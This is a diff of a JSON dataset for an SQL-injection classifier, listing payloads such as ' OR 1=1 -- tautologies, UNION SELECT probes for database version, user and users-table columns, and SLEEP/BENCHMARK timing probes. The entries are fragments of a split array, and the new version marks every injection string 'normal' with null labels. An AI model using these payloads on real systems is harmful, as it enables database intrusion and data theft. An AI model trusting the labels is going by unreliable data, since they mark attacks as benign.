@@ -1,149 +1,149 @@
 [
     {
-        "id": "207e192c-7c77-4b5b-a12f-200fa8e1a3fd",
+        "id": "6fb29678-1858-409e-ae30-fb366917fa3f",
         "payload": "```json",
-        "prediction": 0,
-        "true_label": 0,
+        "prediction": null,
+        "true_label": null,
         "type": "normal"
     },
     {
-        "id": "0e2e8192-73ca-43b1-8b1b-e3ae8dec8659",
+        "id": "4580cb7f-e578-4406-82c4-ffbb204b4b14",
         "payload": "[",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "99b9846c-9b85-4d7f-9172-80ae8243d339",
+        "id": "7cac4621-c089-4b4b-acde-9953116e8e85",
         "payload": "  \"' OR 1=1 -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "122f5d75-8b8f-4183-beae-4b236e660c32",
+        "id": "ac76a450-b104-42f6-a4c8-c0b796e19a6a",
         "payload": "  \"' OR '1'='1' -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "990e32c8-0dc8-4d86-98d7-861e32908fc3",
+        "id": "52a099d3-730e-4959-8ca1-d8d2f4b7e9f4",
         "payload": "  \"' OR 1=1 #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "a958cb7b-b1bb-4cdc-a90b-8c87bed846f7",
+        "id": "6af46be9-5e40-4556-981e-f6fd7bd992f2",
         "payload": "  \"' OR '1'='1' #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "2a2a226d-43b6-4bdf-acf7-ddb4f79f8596",
+        "id": "f6197db2-a124-446e-bc42-4bdba17aff9d",
         "payload": "  \"' OR 1=1 UNION SELECT 1,2 -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "43de3ac1-7949-4772-83fc-9db713aea7c1",
+        "id": "77110d3c-e36e-4bda-9647-203412bfeba5",
         "payload": "  \"' OR 1=1 UNION SELECT 1,2 #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "fda87a0c-f278-4520-83f5-bf4fcd1d79d2",
-        "payload": "  \"' OR 1=1 UNION SELECT @@version, database() -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "ed24e80a-a5f6-40d8-b776-d861593a998a",
-        "payload": "  \"' OR 1=1 UNION SELECT @@version, database() #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "955dc0c7-56cd-459a-b797-fbab2c87dac0",
-        "payload": "  \"' OR 1=1 UNION SELECT user(), database() -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "2ed98f33-0466-413f-92ed-84bca71e62c8",
-        "payload": "  \"' OR 1=1 UNION SELECT user(), database() #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "17945d62-181d-48f0-8538-0a85b667126a",
-        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM users -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
-    },
-    {
-        "id": "03c179ee-2bb5-4280-a5bf-8966d5ae2381",
-        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM users #\",",
-        "prediction": 0,
-        "true_label": 0,
+        "prediction": null,
+        "true_label": null,
         "type": "normal"
     },
     {
-        "id": "a6da1efe-fd55-42a5-9523-6e765e1206e6",
-        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM information_schema.columns -- \",",
-        "prediction": 0,
-        "true_label": 0,
+        "id": "84c489e1-1f09-4d69-b9f4-c00724453a1e",
+        "payload": "  \"' OR 1=1 UNION SELECT null,null -- \",",
+        "prediction": null,
+        "true_label": null,
         "type": "normal"
     },
     {
-        "id": "065223d0-75b0-4dae-a889-1809a4ed476d",
-        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM information_schema.columns #\",",
-        "prediction": 0,
-        "true_label": 0,
+        "id": "84a2e44d-4d49-49e3-8d68-826c5d62d95f",
+        "payload": "  \"' OR 1=1 UNION SELECT null,null #\",",
+        "prediction": null,
+        "true_label": null,
         "type": "normal"
     },
     {
-        "id": "bdbb22ca-8697-4f4e-9025-33a6c3dee737",
-        "payload": "  \"' OR 1=1 AND 1=2 -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "id": "d1c7bf80-438d-4630-8d4b-61752a82411d",
+        "payload": "  \"' OR 1=1 UNION SELECT 'a','b' -- \",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "00db0f63-39f2-4f31-ab36-bd3007a9482d",
-        "payload": "  \"' OR 1=1 AND 1=2 #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "id": "0a96fba6-4724-4097-bf4d-a474a40f4c8a",
+        "payload": "  \"' OR 1=1 UNION SELECT 'a','b' #\",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "335f3992-0f0f-46d5-8d88-a3e99f2b672d",
-        "payload": "  \"' OR SLEEP(5) -- \",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "id": "a309eb35-2235-4fdc-8d2b-479234ea38e5",
+        "payload": "  \"' OR 1=1 UNION SELECT database(),version() -- \",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "1d3e1b19-a854-4c3f-b443-8a878aeeba2c",
-        "payload": "  \"' OR SLEEP(5) #\",",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "id": "2dccf94e-7dab-4f96-baed-5da8f6ade2e5",
+        "payload": "  \"' OR 1=1 UNION SELECT database(),version() #\",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     },
     {
-        "id": "d857971d-ee1f-4c56-960e-f164d9392b99",
-        "payload": "  \"' OR BENCHMARK(10",
-        "prediction": 1,
-        "true_label": 1,
-        "type": "attack"
+        "id": "d81be7d1-f793-4d4f-a21d-5052db2be4aa",
+        "payload": "  \"' OR 1=1 UNION SELECT user(),database() -- \",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "9cb0db44-3775-478f-9958-4935f28181c7",
+        "payload": "  \"' OR 1=1 UNION SELECT user(),database() #\",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "5a833916-95e8-4cf2-bd27-2bcae0b3e515",
+        "payload": "  \"' OR 1=1 UNION SELECT 1,SLEEP(5) -- \",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "dcd2891c-0884-4719-b5c9-9cf1b742ae7d",
+        "payload": "  \"' OR 1=1 UNION SELECT 1,SLEEP(5) #\",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "0220a88e-8504-44fc-961b-4d924a5fd421",
+        "payload": "  \"' OR 1=1 UNION SELECT SLEEP(5),1 -- \",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "9db53d1d-64bb-40e9-96b3-9b9132781edd",
+        "payload": "  \"' OR 1=1 UNION SELECT SLEEP(5),1 #\",",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
+    },
+    {
+        "id": "9d88381d-9b63-4920-9e69-de6abd351123",
+        "payload": "  \"' OR 1=1 UNION SELECT BENCHMARK(10",
+        "prediction": null,
+        "true_label": null,
+        "type": "normal"
     }
 ]
